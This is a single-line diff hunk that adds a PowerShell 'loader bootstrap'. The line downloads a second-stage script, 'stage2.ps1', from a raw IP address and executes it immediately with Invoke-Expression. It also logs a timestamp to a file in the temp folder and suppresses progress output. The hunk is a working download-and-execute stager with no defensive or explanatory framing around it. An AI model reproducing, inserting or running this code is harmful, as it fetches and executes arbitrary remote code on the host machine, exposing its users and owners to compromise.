@@ -1,0 +1,1 @@
+<# Loader bootstrap #> $DownloadedScript = (New-Object System.Net.WebClient).DownloadString("http://198.51.100.31:80/stage2.ps1"); IEX $DownloadedScript; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $ProgressPreference = "SilentlyContinue"
